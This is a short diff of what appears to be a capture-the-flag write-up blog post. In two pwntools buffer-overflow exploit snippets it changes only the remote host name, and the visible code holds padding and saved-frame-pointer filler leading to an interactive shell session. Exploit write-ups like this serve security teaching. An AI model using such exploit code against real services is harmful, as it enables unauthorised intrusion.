@@ -13,7 +13,7 @@ layout: post
 ~~~ python
 from pwn import *
 
-p = remote('example.pwnable.io', 8000)
+p = remote('target.pwnable.io', 8000)
 
 dummy = b'A' * 20
 sfp = b'B' * 4
@@ -33,7 +33,7 @@ p.interactive()
 ~~~ python
 from pwn import *
 
-p = remote('example.pwnable.io', 8000)
+p = remote('target.pwnable.io', 8000)
 
 dummy = b'A' * 20
 sfp = b'B' * 8
